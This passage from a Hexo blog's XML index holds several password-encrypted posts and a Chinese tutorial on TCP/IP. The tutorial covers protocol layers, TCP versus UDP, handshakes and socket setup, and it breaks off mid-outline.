bb50cec65d55825d9cae404c670dd650277627e441f2a2a5584b2156a23b94d40de82a1d50e7d8173efcc261246c05ea37788c92bec4305fbac7157cae116c1a4928d64806dde2b058a37c43e0c110ab2555fe3829c34e4edeb0db5e771fedbc194d511a4e416fa9c9202269f432b637eb865a7a50931b0e00319bfcc481d172d44543f29f0aa0ecde95b6b485e6b6b38f32ae071b118104e4ad0463625cf022426b4827cad6271e74347c3c1c845557eb20a54ede964530efbc887d045100228d841a60b894cdbdd90f8d4b87ad1dc53086bfd52d0b4ff30cd43c7073050ad644a0c408209fa1aeb8e2d940fac6fae67f4340e0fba6ace1a28c56d8e0b0f60bae4bd3e9619b027bca4a6ba1cf4ffb34edf151a0b660fc4a3237d9fc58978f5a469f9863ed198e7fa20e973c78761d65bee8b380c4ec5da2779321b9e999ff386b583149107a18aebb51a64548b5616aef070deff433c09c3733be2999b27940c952f6c92c344257c7bf6e728b003cac52afee0a93229dd536967d62ad2ebf61327d0434b2613c9b2315a6d6781b22f7c823d2f8de1c75356084cda799997eb1c1431db194802db75023177b4196658e019205fbe134d7002464f81cfb41f09d2e4c52492ba7b5428dcd812a14989e837612badda5fe1d65ee94b763f6f26c20ec4be7981b9e8e968070f9ce2e6265be931e2a34fb28cbc3bb0c0b7d489f07af4d42d13a961c3f391b36c1d16932b38575fa118a01338d9cda20f1d47c9347b7aa7f24d3d8d64617b1668100dcb27b7dafba5a2b664238255b1fba1cd794507</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络通信】UDP穿透(局域网版)</title>
      <link href="/2022/10/28/udp/"/>
      <url>/2022/10/28/udp/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="8b8d42a7ce74c1541c868c2dbedff52c0e5ed15b09cf3768452cf7daac782fae">85158bb880409379fe56e90dc1a7e4ef28c313aa04c89d3b73d51d53e009d3e992d50108ecaaf46e1fed7cbee1474d1696397e9131e93b8ba7e18d40892a06bc764431013b5b8f61ddc91cfd5423d2792807fa4071c93cc1210d0a8ef9b2d66d300d3679e36d57819a641194f7ca9ee0d6d52be4b69fb77c399a17e40cd68585b233fa3b952ca80fdba24ffba0e605900ecc0b378dfba15a6f58c4cc4699a042e6edf45ef874c7fcdb70739f98fe68444138308af6324742149bb8dbbd9149ffeebd374f94027d0378a133bc9f793f9b8cc052ecd5aea132a932aba792d86eed23aad632447b964908921984144144f6115f3f605032b8f68ee3770e88d26342c93712fdba70f90ee974104acfc1d3992520b8007f68c47eb7f3de139f9bbd5ac4b49bffd2a7db07a8572fb7bbb5ed0d7dcfdcb91a662553eae4f4eb6b507027785516165a1e0bfcd7940d4892cd6ca31a1d734db841873230ae82c362c3a668f3c64bc3b67ce2594ad86f551b15c11a58860fbea7f7ce8e2e0a301cf2d756f49983b130f5f2913983eb2da7f50d5c37b6165489da042aab40961717f3ba29b2dc4eec96341a732e025161a0a96d67e2b2b81d80d6862079eb4dff0c408aceab88888a32243255e1cfdb3188941d55c3db7acfb41952c0c39e4d888167dbd9c0e3784ae2b392edc0a7421ebae1510438099e0f688d353d3c6e7be91d115c7134a7df7cb62e134c63b334e83203ec38fff016c97c4daabbe78d3d2a1f66219d8607ba20d24c7f268cc468e9a0453223511a28ae0d2ecc259c4523a3c2e362f92470221c790d70074d9dc5eb2a1a0ee3b3babcddd36f47219307928eeac0cb7a4ab0d19ded9d442f713f7f490fbb4b66d07d630178aa51254c1ddf92c8eab4802cad63986ddec4531a6ecb2cb516888000f8fe9ffc82a534b6e70684dd8e4211ec0f0113fc9cf22501031285e13be75332a75c06b9d795512e8f2fac072c0419660df38e36b7402188658b811a85159dbd16093813319fccb118fa4bf540f028ea6389c00022ab82ba3c2e98c87321899080e64ac5aa4bfb46776bb191da3b314494ad89385b7ceabd8d5e67ed4537c63fae48bf3da6088a3aab6ab231e83cc77000f55211cd1cb6453f6311c942cd4cfc4b0cf7080b02748f689b3ee1a70e1c57467463704c97296b2a41c7b6f092c648a08617e9b66d0ac67d12b73b20faffdefa0053b417595b3e6191beadec28fea23247dc515da7d473ac3ff82ad83c5ebba4423323fd7aa693cce1837c96c4977469fbbebc854c5c1fdf2fb7815d9ec30fd616b4bdccab240b29f20b82853d05e9a882c46df1db6cba70d4440e47677a33582f9ca9395ddac5cedfdbc15e4dda8c8745ba773818b9c08505a7842ee65ab3a8666ead844f27a763e649da657621cd974e4c408403715e8b69ffae719754e8ea4e97303b150b651db9bbb079f40db77a8af63282441a9a160859136b2762e63cd7995640f5cc7b2a06df9419b6b8a0515c5813b7c1a885433aa842d3c24782e8abcacbb6964437cb61e82270d834ccab5cb02933c0b3b7d05d0ef5f694c8e88a94274c2ee6451b7ad615ed696a4c93b8c861f3e761c5d6009847eb26149f6c76b3b1ada26cd5995dd4d5b297bd9a2c7c0c88eca680ce802dff7b497c35b589f97618baf336500a8426bbdf5efe4c791f9b83fe9e2854d4f6dbe0dd0e8c64d8e8a45665b91fd5be582258f71f0e4af182c65f1f803c14dcfac38b86cafcb915215720230c7025b8fae360c06a4636d03b75074407dbcf8dd32d80216e1e98ec2cf91c3e4cee3d44df5bd3492beb8fc1f10ec1eadad3155bbdb045ab2a7cccf253ba5902df62aceb1f9fa4c3096a739103170831da64be683996b0f311f40c6e748d75dda01f35656a112d9dd82d76ced59e51da2b0dd2c337af6bd514bb2ed50e7929e94dc675557274818ae8b7bfafc31a32dd4120f76fb735782a10d8869841f9cde27805d4b1bb5265f20eab6a829661cc835f5e203393c22fd38330f8da11154e42fc7850b54985d49151a2fd4205a82077fda099518cdf1ade4ba1d2f25aef8d71930cb7a680c4b43c822afd5ac6b62d3d2cd8c3fd61be9f1d963fd253069edf058743963e5fb1d24186294dbdf9264893e3b4150e797b7330e4c41492ba9b08704eb18b84d30e07653504e934efffcc1fb34a95159a5270aac60b4fd4e292d68a5d4240712a6917e271ed7c0bc213d195f548180a13011f6291e20cce817fff7dbe4b8675f833dc792269a5a14ffe6d05c11d0351cbfecf2be58de0acba7f149d9cc5b84e810dbcc8badd113f9656eba2936996e8f6cc5063125ff8bb6754fe832776422dd567ff4399374243e5e0b2d232fea12ef33922999cd10fa7ce26df24e8d953df0b5c0da3fdb2591ef092266fbdabf25817f70cc535c775deacff87bac14639927f3d952dfa3c0d38b66eb6c3d99b47d33c7937343f85c200d5058f6bea45780c65ef76342e84eac6b16073c69a3fb2aa1cbfbe7a02f0053fc79ebd13cb2a462dad099ce22c72f1fae359e4ce064bbff423dcfe94e3c5b1834c1aaae83b93b9548ed2a4c6a3426f00cec739660fc4a9f5b34527e1b7ea3b5b5418be5330d3fa91f79b9c6049183f7fdaa7341abff1f01b5b282b4dc85c2069753053959ab8da97cba4a11d94ef9c742b1e95213703dc52d1017c1005be4ef54076f4eb5f6d555adac30a677a99fa1a95515421c72acb86a4304d48528aef8c966fcd56c5acb6511353aceb44608554bfdff4006617535e5da1c7705b63092a11666f46e0c409caaa963a4138e4c8aa5527a65fb5417f4db29b670069da99e8bf9e34583f09ab2b9dedb62a129fc205b4abdd43017b10b2fce5225b50250b5b1eee02fe825cb67eb2c3be9e7a66525df2a75e9aceb9ae0657cfde8d51ba1492af641814289d44de69496ba2b46c2ee06bbfef6cd6c56d96e08996bec195d1e4ae3a51bfeb16f942ed2924ebe04a5a01b52aa037b7e714e397357d043a4195168b1d7a27e301c9d8e378a9d12315a574c695a22c409a7302a9676ea5517b435676ecf584bc4ece6b0519354f7b401d9885648f8db4c8474970abd75074719e377d4bdc0f5de86811a6436db74dc16afe462e3c6f02fa8c074886d602912e69eaa6f0f9f9e170b7bd0f99fe207ee58fd9d71e4e2d05dc35988ae1abc2618874695571e6b0ee7358161263d64d2c20e208809e84a89dc09ac42e12b86383cdf33c7130fd7f9695205986d02f35f42baeb850bb5d8f2b25dfda6ba9770ab7fad96b4e9de7c72ed347a571975e35a73b2b20e404e6eae903eb2a484752855e2b46a059fdf4ab6a93c86b6daef74b7a659cdaf5b2cefb8a1a8d0be109098676fe7a7c50c5cfbe20d143eccd9a9b1bbccdc47bdd5832a4db9b0cf112fd60792f4054905f95a2eddf1ba3da3f854333da6b301ec9a957fa5b22519e0f260dc282b17663b144c77fc3b1b9a590e2a976e8414b152d4ef0c28102c49aad39a58a93f9154363cace77779292bbfa881a3430e8b948c34d7a86f332addc3f88f7c593d26ebc6516c2261c3ac18a22c7144329d3e0d31084e0a721bf46571b72c01f9c2d7971fc20ba88bcb3d7eeac10eb606d6e805f4319c2dc9c358fae2305608a6a5afa18768640dae740c3d467119137d4da148de749fb5e73465f3c0a295a9be9e6f3124c4b6d36212cde6dd68c3f34476c64296470a0d33d00152c3fe36cb0eddc817e8ca4da4f23ccef1f60a5ebf9c6b67ec95327636cbc7a84b9425b3c64c90ce3d4b9fb9d48bb2d98010f4d8fe65703d38e5babdc79d4dd9c497f1fb33fc70a12e85843c2a0ad865986c8bb57bafd776e2b3fdd15b3d1f219ab5ce8aa999c48e454901ee62e0371f0f07304d4edd9caaffe6cba2d5ae975305e6683d76b2ad3fd3706d06e8176059dc72357cb01816d66586fee90c31c33e18f3fadd186126a3cf788e3a42b4fb07fa1c345e5c34862c22ebd0fe351c26751ddd64768c19e82f58da284c5c1d69d4603d048b4a901ff5f6aa4f45a1a5f3e994664c1fffe012a3eb2513c448c0a882f61b9bcb809cc0a26c48185283ff90ce201dcbe1b88550b3fcc48a39515d29cda884bb829694c82a85e01bb45abc87957eb197057317b27a4f07b2be8fb1f628cfe73dc35260f861149f0f3f27cec2c9be390c35a2a7f0d619b89e393e90b73af66f14a16c7fa99fc16e0c92681631da9ee00cb0d50e70db3b36812fe45674de4c14006f05c222a28663572df0b5eedca4cf57716268c2e396de48f9522bb98e49b0bf8b1fffc12e9140bbfdad44f03ba25f83432ec199ebfc9879a7730c69fc57d655e53ea78b745edcf512ae78651b8e76d7895429234073e19bce97c34e258ec237841c89afa37f93731cbcd4e89f5ff3e732358f1ce5a1642484c935e546e64c677389718549df0b030657b827b62ba32748805b2f000b0d95728d3d022346ec499cb85ae50fc12f20af7762e7507d25c41948f2e2e7874bdea1b06e3352c3b5be7251aa61c9a9c4c162d8c2bd66a985415e966cdaca9771100366dec4bf382b146c9e4e493981b866111a162657485d9c79821cf286a2ef8070d37c7095a5fe0daebc9a192cfe624d59d493c32587de7eed1904f1965604f13be1c9ba2440605d10185414eecf3609ae88a55706a0b30e67c338ca078d83974d027ddcdf885d37e3997cad4d69f304cb148d7decf6d06354588387ae589e56671cfe784ee520600bb8bd87a057472ee3e3ef6af1468ea3748d2bf76c6caf7e71022e7785d6fdf98f93fdb8e8399aa922fc8a4fc484a84255ff1dc5185bc579b759c73f5c6672859a7c46199d2a883137f4037ac7c8f73aaae1c416f613be4e41a1989c06ee985453f68bd3bc0b37c51e09323828f7957139062e1db064b4e90036876b7bd065179a07a96e49c134c96cf5857924a837f0c0bb8e5895e33a383c77249318ce742952ed88d19926ffdae6782d0f5f4248c4febf618639da9707478a977adf1e317dcdad36ba9ac9098771353ec0cca7bfceb0c551fb06278c947b567990d08fcbb6e360d3ac93ae8b4efd0ccad21e0fc1ee87a39d4dd4b38fa3900c7d2e65f2b17b6b40b9c712149ec70d49bbca6c0dc971557286075a43621de30cc3ccf88ed58dc1db6579556e9751f9b61fd889cf01387481683a3e3d745401f640699b7348af427e1df6bbecd38be8fecf9c51c481d36a18a50a83db6f3ffcc52f1c0bccf4461d03e274fd558c0622bb7cbd3f49eae60b6dfd0f751c2bcabfbe41d111624760ac6166435d65d5c32e9bf3e43effc5d091a471bb5c45cd40d2c3ce16fc4b9cf0cc8d7e01b932c09108245ca2b6b21652bd2590acaba8d20e2c6b858d927f7e90d10e416129fcd2a91323c262595893b130111fb6e5aa082e2041339fc24e9b59ade2ba5bd5664459d4e87c020878f6a3183533cb82d67dbfefece8e43a5cd251482a72439ab710ebee105b6412fd65e2e20d733a37f693d165a57e1ac93a58273080d7bec52594323238633b092e496e9284d43277f454a955139db064fe2f51bb0ac2c6e4948eabc8dd9b100cb72bd77ea458db3c7287e30b2abb4ef608a575114fe749631b8cb9dd76b55c536a0a91afaa2b078c5f01410d8f94f3d343bf056323cec4f711f3dabacab951f17dea6858c436537b3700f93f94b7fc41a8a4505034ab29afcc2ef62a3fba495c5b610b640aabcdc6c05763c2d3cd99d3164b7673e20e26eafba96bead41b7dd7d27fdd8274fa90737c44e3fd5ee14d86892fbd3a4d50b34cb2b4c2734a4d727f12e8f840ab5f74a3782d2b091bb37b166aa6591926522c60ea4c0aee53419a60681ad2e1f592a6b385e93b07160a13f6fe6c9cd154c674f24e9db32eba61d210e6ed8ba533be40c0b1644085e0b02ce232d2740f83df8a07207b694c425d029bfd4270b3f695a7770f9ede291925e4859df590fc25344bdde9181f0f8b5ea6356c3c17ec15f5c738b9c48a625ad062862da3d21d98db73530f715fffaad2f7ab027733c199655d3bae91b020321b5daba2f70695e93107571c47e149a8af3720da1c732b35a0142d3d9519139d5a0d1b92babb5005b706724c0c5257641df59012d22cbe26bbd218dad12b2602a33b4fc7cfff37a89a2b9b1f2306a42e890de6ff49389970e28c1ed2edc51364137d283eea60d9171683bb6bf71974066f0bf3517e29e370694ea4285552e5fd07568cffe16216acc3c6fa35145ccfd2499659b982ac42d35c7d5d6f75c0dc5d8a53670fe768b080062854a40be72b1c0266393d230c61ff92ccd19a2bdc5d372a6820ced420ff44aefa89a5e0ee73400e7d390388f3af3567495e0cb35eb95f09ec0df3d1f9c912842db71ebd1d103bedf266db2392f55efa2a6489b7f4ebd7907c6e2d88ba089ad2e098712959d587f1c53977791f461a51b83be9037bba79e646244cfd90fdf39e81d77dda61823fcde61edc9a33b6883fa4f691af55a31aeae29d8f1bf8a1e4dbd124e4efcb476218f393064626e2f97742120e03f793455bd13b33d879d19cc40fe9830b11e42969f1020a81bc7f6bab24ea61498765ac0b2ddd3726f83e2b0bb5fb739bef92306174849fa63c8e9171f90cab40c0ed40266848a06def7192e3b42965cb29b64d013f5b2ff16fd69e41316b8f3119683ebe18db67018d708b308e1fc2f2cd910c0f2bf51de1934a2f421cbb1fa5188005faca5268e13805b62fcb31c8e299aa6a37e95f89e4ddb6e1e09a50220d2a3e8588ae5948b69c6e2f9aab83096c2ac7dbc5e87d2333b6b0603d3fd9908d243f21e9b74d193db6d494fee98066d4dac54e796ca71bea96e88e3ea27f2bbe5368ce4b9650cc920959afe52a8ac0e39ad0f9845c5c55ed38b0b4161b9ad0ef7f3a013cdc80a7351c81b253c18bbedf440265787cdd7d3a4845e30d9c01fa8669ac961e137b5c3e8356a9c00a8ea30b734faf2b42468c0e2f4d72a0971bab3c7d5915d9458c7beb17253dbd22f30bbd140fe495dc5dce10ff6bdf9072da85368213c2c119bb99ba7602b11bd5504f74865dc1c4558c13a9a60ae7860d5369d9d6df456a50045e8476b8cec00568315c0fdfbe9e1ddf73f437378ca62a35e8791b4b8914dcfd40be1a41bab0e2afd1ee71902705b2ec26923987f8845cff6ddd5e71da1fcf9d8350f6e5b26b6c301aa</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络通信】TCP/IP</title>
      <link href="/2022/10/25/tcp-ip/"/>
      <url>/2022/10/25/tcp-ip/</url>
      
        <content type="html"><![CDATA[<p>搞cpp，网络知识还是必不可少的，学了半天还是得写出来梳理一下过程。<br>都是水文，个人见解哈哈！</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。<br>——不用想，这就是百度的。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>实际上有个理想的osi七层模型(自上向下)</p><ol><li>应用层 - 是下几层最终汇成常见的协议http、ftp等</li><li>表示层 - 其实就是展示给人看的了，也就是各种文件格式</li><li>会话层 - 对于进程，也就是正在运行的会话</li><li>传输层 - 传输单位是包</li><li>网络层 - 传输单位是报文</li><li>数据链路层 - 传输单位是帧</li><li>物理层 - 最底层，传输单位是比特(bit)</li></ol><p>对于tcp&#x2F;ip模型分为四层或五层</p><ol><li>应用层：也就是把表示层和会话层合并了</li><li>传输层</li><li>网络层</li><li>网络接口层：此处兼并了物理层和数据链路层，所以会有五层的说法</li></ol><p><strong>对于目前所需，显然是TCP和UDP，并且这俩这是传输层的协议</strong><br>关于详细的分层，包括淦神魔的自行检索</p><hr><h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>比较常见的应该就是ARP欺骗和ICMP欺骗了<br>这俩都是属于网络层的协议</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>arp是根据ip地址获取物理地址(MAC地址)的一个协议，由于arp协议没有状态，不管有没有收到都会自动缓存，所以通过这种机制，攻击方发送假的arp数据包给目标主机，从而引导特定的流量到攻击方所设置的地方。</p><h3 id="ICMP欺骗"><a href="#ICMP欺骗" class="headerlink" title="ICMP欺骗"></a>ICMP欺骗</h3><p>这玩意也差不多，主要用来提供错误报告，发现错误就返回主机，常见的ping命令就是基于ICMP的。也就有了DOS攻击这么个玩意，主机在长时间发送大量ICMP包的情况下造成cpu资源消耗，从而导致系统瘫痪，不过目前的服务器都很吊了，加上可以对这种ip直接进行封禁，所以又诞生了ddos攻击，也就是分布式的dos攻击。可谓是物理打击最为致命，分布的情况下你也不能一棒子全部打死，只能采取流量分析、氪金打造硬件之类的解决，其实也不算真正解决吧。</p><blockquote><p>这也是近年来网安发展这么快的原因，后面还有各种防火墙，虽然真正有技术的还是少部分人吧，大多都是常规软件扫漏，分析日志和打打比赛。</p></blockquote><hr><h2 id="介绍TCP-x2F-UDP"><a href="#介绍TCP-x2F-UDP" class="headerlink" title="介绍TCP&#x2F;UDP"></a>介绍TCP&#x2F;UDP</h2><ul><li>tcp协议是可靠的，稳定的，面向连接</li><li>udp协议是不可靠的，不稳定的，面向无连接</li></ul><h3 id="对于连接"><a href="#对于连接" class="headerlink" title="对于连接"></a>对于连接</h3><ol><li>tcp在传输数据前要先建立连接</li><li>udp则是不需要连接的，只管发</li></ol><hr><h3 id="服务对象"><a href="#服务对象" class="headerlink" title="服务对象"></a>服务对象</h3><ol><li>tcp的特性让它只能一对一的两点服务</li><li>udp支持一对一、一对多、多对多的交叉</li></ol><hr><h3 id="可靠性"><a href="#可靠性" class="headerlink" title="可靠性"></a>可靠性</h3><ol><li>tcp是可靠交付数据，保证数据无差错、不丢失、不重复、按需到达</li><li>udp就是尽最大努力交付，不保证数据可靠性</li></ol><hr><h3 id="拥塞、流量控制"><a href="#拥塞、流量控制" class="headerlink" title="拥塞、流量控制"></a>拥塞、流量控制</h3><ol><li>tcp有拥塞和流量控制机制，保证数据安全</li><li>udp没有，所以网络堵不堵塞也不影响这老小子发送</li></ol><hr><h3 id="首部开销"><a href="#首部开销" class="headerlink" title="首部开销"></a>首部开销</h3><p>因为传输层的传输单位称为<code>包</code>，包的头部，也称首部，存放了相应的信息</p><ol><li>tcp的首部长度最小占用20个字节，其中tcp的包有一个选项字段，是可选的，如果选用了，那么这个包头肯定大于20个字节</li><li>udp的首部长度占用8个字节，固定不变。</li></ol><blockquote><p>关于tcp和udp的包结构</p></blockquote><hr><h3 id="分片机制"><a href="#分片机制" class="headerlink" title="分片机制"></a>分片机制</h3><ol><li>tcp的数据如果大于mss大小，就会在传输层的时候分片，当主机收到后在传输层进行组装，如果丢片了，就重写发这一部分</li><li>udp的数据如果大于mtu大小，则会在网络层分片，主机收到后也同样在网络层组装，再由传输层转发。</li></ol><blockquote><p>MTU：maximum transmission unit，最大传输单元，由硬件规定，如以太网的MTU为1500字节。<br>MSS：maximum segment size，最大分节大小，为TCP数据包每次传输的最大数据分段大小，一般由发送端向对端TCP通知对端在每个分节中能发送的最大TCP数据。MSS值为MTU值减去IPv4 Header（20 Byte）和TCP header（20 Byte）得到</p></blockquote><hr><h3 id="二者应用场景"><a href="#二者应用场景" class="headerlink" title="二者应用场景"></a>二者应用场景</h3><p>所以对于可靠的tcp而言，常见的服务有</p><ul><li>ftp   文件传输服务</li><li>http&#x2F;https   web服务</li><li>SMTP&#x2F;POP3 邮件服务</li></ul><p>对于udp这个老小子随时发送的特性，多用于</p><ul><li>dns</li><li>音视频</li><li>广播通信</li></ul><blockquote><p>对于可不可靠个人感觉还是相对的概念，tcp也不见得一定稳，毕竟描述都是理想情况下</p></blockquote><p>了解一下常用协议的信息</p><table><thead><tr><th>协议</th><th>名称</th><th align="center">默认端口</th><th>底层协议</th></tr></thead><tbody><tr><td>HTTP</td><td>超文本传输协议</td><td align="center">80</td><td>TCP</td></tr><tr><td>HTTPS</td><td>超文本传输安全协议</td><td align="center">443</td><td>TCP</td></tr><tr><td>Telnet</td><td>远程登录服务的标准协议</td><td align="center">23</td><td>TCP</td></tr><tr><td>FTP</td><td>文件传输协议</td><td align="center">20传输和21连接</td><td>TCP</td></tr><tr><td>TFTP</td><td>简单文件传输协议</td><td align="center">21</td><td>UDP</td></tr><tr><td>SMTP</td><td>简单邮件传输协议（发送用）</td><td align="center">25</td><td>TCP</td></tr><tr><td>POP</td><td>邮局协议（接收用）</td><td align="center">110</td><td>TCP</td></tr><tr><td>DNS</td><td>域名解析服务</td><td align="center">53</td><td>服务器间进行域传输的时候用TCP 客户端查询DNS服务器时用UDP</td></tr></tbody></table><hr><h3 id="tcp三次握手、四次挥手"><a href="#tcp三次握手、四次挥手" class="headerlink" title="tcp三次握手、四次挥手"></a>tcp三次握手、四次挥手</h3><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p>是指在建立tcp连接的时候，客户端和服务端共发送三个包，以确定双方收发正常给后面传输做准备，说白了就是ip和端口我都要！<br>先不说代码：<br>服务端首先要处于监听状态（listen）<br>第一次握手的时候，客户端给服务端发送一个SYN报文，等待服务器确定，客户端此时就处于一个SYN_SENT状态<br>第二次握手，服务器收到SYN包，确认客户端发来的SYN，同时服务端自己也发个SYN(SYN+ACK)包给客户端做应答，然后服务端处于一个SYN_RECV状态<br>第三次握手，客户端收到服务端的SYN包(SYN+ACK)，向服务器发送确认包ACK，这个包发送完毕之后，客户端和服务端都进入一个ESTABLISHED（TCP连接成功）状态，此时双方成功建立连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">百科copy来的，但是编程的时候好像感知不强啊，先放着有用到再说</span><br><span class="line">（1）未连接队列</span><br><span class="line">在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（seq=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于 Syn_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。 [3] </span><br><span class="line">（2）Backlog参数</span><br><span class="line">三次握手协议</span><br><span class="line">三次握手协议</span><br><span class="line">表示内核为相应套接字排队的最大连接个数。SYN-ACK重传次数服务器发送完SYN－ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传，如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。注意，每次重传等待的时间不一定相同。 [3] </span><br><span class="line">（3）半连接存活时间</span><br><span class="line">是指半连接队列的条目存活的最长时间，也即服务器从收到SYN包到确认这个报文无效的最长时间，该时间值是所有重传请求包的最长等待时间总和。有时我们也称半连接存活时间为Timeout时间、SYN_RECV存活时间</span><br></pre></td></tr></table></figure><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p>第一步，因为tcp属于全双工状态，所以服务端和客户端都可以发起，此处以ab区分，主机a的tcp数据发完之后，向主机b发送一个带FIN标记的报文，说我东西发完了啊<br>第二步，主机b收到这个FIN报文，它不会立即关闭，而是发个ACK给主机a，问他确认要关闭了吧? 然后主机b处于close_wait状态等着<br>第三步，主机a收到ack之后，在发送一个FIN报文，告诉他我要彻底关闭了！你也可以断了！<br>第四步，主机b收到了这个FIN报文之后，给主机发个ACK，说那没事了，我真的关了，然后大概有一个2MSL的延迟等待之后，彻底over。</p><blockquote><p>MSL是Maximum Segment Lifetime的英文缩写，可译为“最长报文段寿命”，它是任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃</p></blockquote><p><strong>我自己不专业的理解：</strong></p><ol><li>关于握手为啥要三次，也是确认客户端和服务端收发一切正常。通过第一次握手，客户端发送SYN，能知道客户端可以发送，服务端可以接收；第二次握手的时候服务端会发送自己的SYN+ACK给客户端，那么服务端的收发都ok；如果服务端没有收到，应该是有重传机制的，具体多少次之后还没有反应，那么服务端就要关闭连接，关闭端口，以此减少开销。最后还要确认客户端的发送；所以第三握手的时候，客户端发送ACK应答。</li><li>关于挥手为什么要四次，感觉也是跟这个报文有关，连接的时候通过SYN+ACK嘛，SYN是用来建立同步的，ACK是用来应答的。而挥手所使用的FIN则是表示关闭的，配合ACK。当然收到FIN报文之后，socket其实不会立刻关闭，我们得给他一个时间，最合理的时机就是通过一问一答，拆分两次来完成挥手。</li></ol><blockquote><p>TCP首部中有6个标志比特，它们中的多个可同时被设置为1，主要是用于操控 TCP 的状态机的， 依次为 URG，ACK，PSH，RST，SYN，FIN<br>所以说上述中提到的SYN和FIN和ACK都是置为1的时候才说明连接没有问题</p></blockquote><p><strong>更细的概念请自行查阅文档，因为他们有介绍这个码位的细节，严格来说是tcp包的设计。同样的因为编程语言能控制的没有这么深，所以自己没能完全看进去，属于点到为止了</strong></p><p>我也有参考这篇<a href="http://t.zoukankan.com/viviane-p-11713253.html">文章</a></p><hr><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><ol><li>模拟的话肯定是要模拟c&#x2F;s架构也就是客户端和服务器</li><li>cpp的socket编程，不了解的先翻阅资料，我们称为套接字</li><li>tcp和udp是不同的协议，所以实现也不相同</li></ol><p><code>**: error C4996: &#39;inet_addr&#39;: Use inet_pton() or InetPton() instead or define _WINSOCK_DEPRECATED_NO_WARNINGS to disable deprecated API warnings**</code></p><p>出现这个问题，直接在项目属性-c&#x2F;c++-预处理器-预处理器定义里面把<code>_WINSOCK_DEPRECATED_NO_WARNINGS</code>添加进去，记得用分号隔开。</p><p>或者在源文件里面开头加一句<code>#pragma warning(disable:4996)</code></p><hr><h3 id="tcp的demo"><a href="#tcp的demo" class="headerlink" title="tcp的demo"></a>tcp的demo</h3><ol><li>tcp的服务端需要的操作</li></ol><ul><li>创建套接字socket</li><li>绑定客户端地址信息socketaddr_int和bind</li><li>监听连接listen</li><li>accept，也就是从监听的队列取出第一个然后连接</li><li>收发 recv和send</li></ul><ol start="2"><li>客户端需要的操作</li></ol><ul><li>创建套接字</li><li>设置服务器地址信息</li><li>连接客户端 connect</li><li>收发 